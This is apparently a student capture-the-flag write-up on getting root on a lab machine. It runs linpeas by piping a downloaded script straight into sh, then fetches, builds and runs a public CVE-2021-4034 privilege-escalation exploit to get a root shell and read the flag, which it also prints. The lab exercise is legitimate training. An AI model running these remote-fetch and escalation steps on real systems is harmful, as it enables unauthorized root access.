[Summary](./README.md)

## Exercises
1. Find the root flag hidden on your student machine.

> Flag : BC{y0ur_f1r57_r007_fl46#_w3ll_d0n3}

I've used Linpeas like this first to see which vulnerabilities I could try to exploit :

    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

The vulnerability I chose is **CVE-2021-4034** and I downloaded an existing script to exploit it :

    wget https://codeload.github.com/berdav/CVE-2021-4034/zip/main
    sudo apt-get install unzip
    unzip main
    cd CVE-2021-4034-main/
And then I did as instructed in the Readme file :

    make
    ./cve-2021-4034
Then you'll be in the shell as root and be able to navigate to the root folder where you'll find the flag.txt file:

    cd /root/
    cat flag.txt
